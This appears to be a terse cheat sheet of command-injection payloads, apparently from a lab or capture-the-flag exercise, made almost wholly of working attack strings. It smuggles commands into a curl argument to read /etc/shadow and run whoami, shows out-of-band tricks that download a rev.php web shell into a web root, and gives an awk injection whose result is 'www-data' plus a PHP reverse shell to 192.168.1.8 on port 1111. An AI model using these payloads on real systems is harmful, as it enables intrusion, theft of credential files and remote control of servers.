```
Command: curl -I -s -L ;cat /etc/shadow;asd | grep "HTTP/"
```

;whoami;asd

Command: curl -I -s -L ;ls -la;asd | grep "HTTP/"

# out of band

```
http://127.0.0.1:8080/?`whoami`
```

or
```
https://google.com\n wget http://127.0.0.1:8080
```

```
https://google.com && curl 127.0.0.1:8080/rev.php > /var/www/html/rev.php
```


Executed: awk 'BEGIN {print sqrt(((-1)^2) + ((-)^2))}';whoami;#)^2))}'  
Result: www-data

payload:

)^2))}' ;whoami;#

```
)^2))}';php -r '$sock=fsockopen("192.168.1.8",1111);exec("/bin/sh -i <&3 >&3 2>&3");';#
```